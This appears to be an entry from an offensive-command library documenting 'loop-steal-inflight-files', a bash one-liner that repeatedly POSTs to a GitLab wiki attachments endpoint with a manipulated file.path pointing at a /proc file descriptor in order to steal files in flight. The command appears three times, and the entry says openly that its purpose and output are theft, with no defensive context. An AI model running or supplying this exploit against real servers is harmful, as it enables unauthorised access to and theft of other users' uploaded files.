---
data: >-
  while true; do curl -s -XPOST -H "Authorization: Bearer $TOKEN"
  'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19603/fd/44'
  -F '[file]=@/tmp/lala.txt' | grep file_name; done
tags:
  - loop
  - theft
type: command
executor: bash
platforms:
  - Linux
id: 198397ff-399c-4e63-80df-d26726f13a98
created_at: '2025-12-11T06:10:15.401Z'
updated_at: '2025-12-11T06:10:15.401Z'
verified: false
validated: true
submitted: true
---
# loop-steal-inflight-files

## Command

```bash
while true; do curl -s -XPOST -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19603/fd/44' -F '[file]=@/tmp/lala.txt' | grep file_name; done
```

## Description

Loops to steal files via /proc/fd and grep for file_name.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `while true` | Infinite loop | Yes |
| `curl -s -XPOST` | Silent POST | Yes |
| `| grep file_name` | Filter | Yes |

## Examples

### Basic Usage

```bash
while true; do curl -s -XPOST -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19603/fd/44' -F '[file]=@/tmp/lala.txt' | grep file_name; done
```

## Expected Output

JSON snippets with stolen file_name.

## Related

- [[procedures/Steal-In-Flight-Uploads-via-Proc-FD-Looping]]
